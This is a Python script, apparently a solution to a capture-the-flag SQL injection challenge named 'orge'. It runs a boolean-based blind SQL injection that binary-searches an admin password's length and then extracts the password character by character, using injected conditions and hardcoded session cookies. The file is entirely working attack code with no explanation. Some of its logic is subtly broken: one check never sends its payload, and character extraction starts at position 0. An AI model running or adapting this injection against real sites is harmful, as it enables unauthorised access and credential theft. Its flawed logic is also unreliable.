import requests

url = 'https://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php'

cookies = {
	'__cfduid': 'dde049027a08a63cb424811663925275a1544694937',
	'PHPSESSID': 'hpk27krufqp74i9af9fllgbhv2'
}

payload = {
	'pw': ''
}

# Guess the length of password.
low, high = 0, 128
while True:
	mid = int((low + high) / 2)
	sqli = '\' || id=\'admin\' && length(pw) < %d -- ' % mid
	payload['pw'] = sqli
	res = requests.get(url, cookies=cookies, params=payload)
	if res.text.find('Hello admin') > -1:
		high = mid
		print('Go lower to %d...' % mid)
	else:
		low = mid
		print('Go higher to %d...' % mid)
	
	if high - low <= 1:
		break
len_of_pw = low
sqli = '\' || length(pw) = %d -- ' % len_of_pw
res = requests.get(url, cookies=cookies, params=payload)
if res.text.find('Hello admin') > -1:
	len_of_pw = low
else:
	len_of_pw = high
print('The length of pw is %d.' % len_of_pw)

# Guess the password one by one.
pw = ''
for i in range(len_of_pw+1):
	low, high = 0, 127
	
	while True:
		mid = int((low + high) / 2)
		sqli = '\' || id=\'admin\' && ascii(substr(pw,%d,1)) < %d -- ' % (i, mid)
		payload['pw'] = sqli
		res = requests.get(url, cookies=cookies, params=payload)
		if res.text.find('Hello admin') > -1:
			high = mid
			print('Go lower to %c(%d)...' % (chr(mid), mid))
		else:
			low = mid
			print('Go higher to %c(%d)...' % (chr(mid), mid))

		if high - low <= 1:
			break
	pw = pw + str(chr(low))
	print('Sniff Sniff...', pw)
print('The password is', pw)

payload['pw'] = pw
res = requests.get(url, cookies=cookies, params=payload)
print(res.text)